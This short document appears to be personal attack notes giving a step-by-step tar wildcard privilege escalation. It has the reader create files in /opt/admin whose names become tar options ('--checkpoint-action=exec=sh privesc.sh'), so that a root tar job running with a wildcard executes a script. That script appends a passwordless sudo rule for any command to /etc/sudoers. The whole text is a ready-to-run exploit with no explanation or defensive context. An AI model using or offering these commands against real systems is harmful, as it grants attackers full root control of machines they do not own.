

=== tar privilege escalation ==
```
Step 1: Go to /opt/admin

cd /opt/admin

Step 2: Create malicious filenames (these become tar options)

echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh privesc.sh"

Alternatively,

touch ./--checkpoint=1
touch ./--checkpoint-action=exec=sh\ shell.sh

Step 3: Create a root privilege escalation script

echo 'echo "youruser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > privesc.sh
chmod +x privesc.sh
```
